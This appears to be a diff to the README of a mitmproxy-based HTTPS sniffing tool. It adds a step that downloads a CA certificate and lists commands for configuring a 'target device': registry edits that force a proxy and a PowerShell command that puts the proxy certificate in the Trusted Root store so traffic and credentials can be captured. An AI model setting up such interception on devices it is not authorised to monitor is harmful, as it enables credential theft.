@@ -42,9 +42,15 @@ With this tool, you can capture all visited domains and potentially exposed cred
 
 ### Steps to configure target device
 
-1. First, run **mitmproxy** on your sniffing device.
+1. First, retrive cert file:
 
-2. Second, enable proxy settings:<br/>
+```CMD
+curl -O mitmproxy.cer https://github.com/sammy-ulfh/https_sniffer/raw/refs/heads/main/script/cert/mitmproxy.cer
+```
+
+2. Second, run **mitmproxy** on your sniffing device.
+
+3. Third, enable proxy settings:<br/>
 
     Set **ProxyEnable** registry key to 1.<br/>
     This key is located at:
@@ -59,7 +65,7 @@ With this tool, you can capture all visited domains and potentially exposed cred
     reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
     ```
 
-3. Third, set the proxy server adderss:<br/>
+4. Fourth, set the proxy server adderss:<br/>
 
     Set the **ProxyServer** registry key to your proxy's IP and PORT, for example:<br/>
     "192.18.100.100:8080" -> "{YOUR IP}:{YOUR PROXY SERVER PORT}".<br/>
@@ -80,11 +86,12 @@ With this tool, you can capture all visited domains and potentially exposed cred
     - **/d** sets the data to be stored in the specified value.
     - **/f** forces the update without pompting for confirmation if the value already exists.
 
-4. Fourth, trust your proxy's server Certificate:<br/>
+5. Fifth, trust your proxy's server Certificate:<br/>
 
     Use the **mitmproxy.cer** located in the  **script/cert** directory and add it to the Trusted Root Certification Authorities store:<br/>
 
-    ```POWERSHELL
+    ```CMD
+    powershell
     Import-Certificate -FilePath ".\mitmproxy.cer" -CerStoreLocation Cert:\LocalMachine\Root
     ```
 
